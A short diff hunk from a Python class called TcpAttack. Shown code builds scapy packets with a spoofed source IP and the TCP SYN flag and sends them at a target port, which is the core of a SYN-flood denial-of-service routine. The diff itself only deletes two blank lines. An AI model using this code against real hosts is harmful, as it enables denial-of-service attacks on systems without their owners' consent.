@@ -38,12 +38,10 @@ class TcpAttack:
             IP_header = IP(src=self.spoofIP, dst=self.targetIP)
             TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
             packet = IP_header/TCP_header
-
             try:
                 send(packet)
             except Exception as e:
                 print(e)
-
         return 1
 
 
